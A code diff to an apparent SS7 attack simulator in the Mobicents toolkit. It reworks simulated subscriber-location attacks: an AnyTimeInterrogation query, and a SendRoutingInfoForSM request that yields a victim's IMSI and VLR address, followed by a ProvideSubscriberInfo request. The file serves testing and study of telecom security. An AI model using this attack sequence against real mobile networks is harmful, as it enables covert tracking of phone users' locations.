@@ -1,6 +1,7 @@
 package org.mobicents.protocols.ss7.tools.simulator;
 
 import org.mobicents.protocols.ss7.map.api.primitives.IMSI;
+import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.AnyTimeInterrogationResponse;
 import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.ProvideSubscriberInfoResponse;
 import org.mobicents.protocols.ss7.map.api.service.sms.SendRoutingInfoForSMRequest;
 import org.mobicents.protocols.ss7.map.api.service.sms.SendRoutingInfoForSMResponse;
@@ -312,11 +313,21 @@ public class AttackSimulationOrganizer implements Stoppable {
 
     }
 
-    private String attackLocationAti() {
-        return this.attackerBhlrA.getTestAttackClient().performATI();
+    private void attackLocationAti() {
+        this.attackerBhlrA.getTestAttackClient().performATI("");
+
+        while(!this.attackerBhlrA.gotAtiResponse()){
+            try {
+                Thread.sleep(50);
+            } catch (InterruptedException e) {
+                return;
+            }
+        }
+
+        AnyTimeInterrogationResponse atiResponse = this.attackerBhlrA.getTestAttackClient().getLastAtiResponse();
     }
 
-    private String attackLocationPsi() {
+    private void attackLocationPsi() {
         System.out.println("-----------STARTING LOCATION PSI ATTACK-----------");
         //Get necessary information from request, use in next message.
         this.attackerBhlrA.getTestAttackClient().performSendRoutingInfoForSM("98979695", "0000000");
@@ -330,6 +341,8 @@ public class AttackSimulationOrganizer implements Stoppable {
         }
 
         SendRoutingInfoForSMResponse sriResponse = this.attackerBhlrA.getTestAttackClient().getLastSRIForSMResponse();
+        this.attackerBhlrA.getTestAttackClient().clearLastSRIForSMResponse();
+
         String victimImsi = sriResponse.getIMSI().getData();
         String victimVlrAddress = sriResponse.getLocationInfoWithLMSI().getNetworkNodeNumber().getAddress();
 
@@ -347,10 +360,11 @@ public class AttackSimulationOrganizer implements Stoppable {
         System.out.println("-----------GOT PSI RESPONSE-----------");
 
         ProvideSubscriberInfoResponse psiResponse = this.attackerBvlrA.getTestAttackClient().getLastPsiResponse();
+        this.attackerBvlrA.getTestAttackClient().clearLastPsiResponse();
+
         System.out.println(psiResponse.toString());
 
         //Location information aquired.
-        return null;
     }
 
     private String attackInterceptSms() {
